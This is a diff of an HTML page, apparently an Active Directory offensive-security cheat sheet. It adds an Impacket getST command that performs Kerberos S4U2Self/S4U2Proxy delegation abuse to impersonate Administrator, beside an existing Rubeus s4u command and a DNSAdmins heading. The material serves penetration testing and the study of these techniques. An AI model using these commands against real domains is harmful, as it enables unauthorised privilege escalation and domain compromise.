@@ -1372,6 +1372,9 @@ tgs::s4u<span class="w"> </span>/tgt:&lt;kirbi<span class="w"> </span>ticket<spa
 <span class="c1"># Rubeus</span>
 Rubeus.exe<span class="w"> </span>s4u<span class="w"> </span>/ticket:&lt;base64<span class="w"> </span>tgt<span class="p">|</span>kirbi<span class="w"> </span>ticket<span class="w"> </span>file<span class="w"> </span>path&gt;<span class="w"> </span>/impersonateuser:administrator<span class="w"> </span>/domain:&lt;target<span class="w"> </span>domain&gt;<span class="w"> </span>/msdsspn:&lt;target<span class="w"> </span>SPN&gt;<span class="w"> </span>/dc:&lt;target<span class="w"> </span>DC&gt;<span class="w"> </span>/ptt
 </code></pre></div>
+<p>Request TGT for service user and execute S4U2Self followed by a S4U2Proxy to impersonate <code>Administrator</code> with Impacket's <code>getST</code>:</p>
+<div class="highlight"><pre><span></span><code>impacket-getST<span class="w"> </span>-spn<span class="w"> </span>&lt;target<span class="w"> </span>SPN&gt;<span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span>&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;
+</code></pre></div>
 <h3 id="dnsadmins_1">DNSAdmins</h3>
 <p>Enumerate the members of the DNSAdmins group:</p>
 <div class="highlight"><pre><span></span><code><span class="c"># PowerView</span>
